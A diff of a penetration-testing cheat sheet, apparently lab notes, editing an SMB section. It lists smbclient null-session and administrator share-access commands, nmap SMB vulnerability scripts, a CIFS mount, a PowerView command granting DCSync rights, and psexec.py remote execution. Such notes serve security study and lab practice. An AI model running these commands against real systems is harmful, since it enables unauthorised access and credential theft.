@@ -191,17 +191,19 @@ Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync
   - prompt off
   - allinfo = alternate stream
     - get/more File.ext:ADS
--  smbclient  \\\\$target\\share$ = Open a Null Session
-'- smbclient //friendzone.htb/general -U "" = see files inside'
+- smbclient  \\\\$target\\share$ = Open a Null Session
+- smbclient //friendzone.htb/general -U "" = see files inside'
 - smbclient -N -L //$target/ = List Shares as Null User
-- 
-- smbclient -U 'administrator%Password@1' \\\\\$target\\c$
+- smbclient -U 'administrator%Password@1' \\\\\$target\\C$
 - Nmap scripts
   - smb-enum-users.nse
   - smb-os-discovery
   - smb-protocols
   - smb-enum-shares
   - smb-vuln*
+- mount
+  - mkdir -p /mnt/SHARE
+  - mount -v -t cifs //$TARGET/share -o user /mnt/SHARE
 - Online tips:
   - [smb enum](https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference)
 - psexec.py user:pass@$target COMMAND
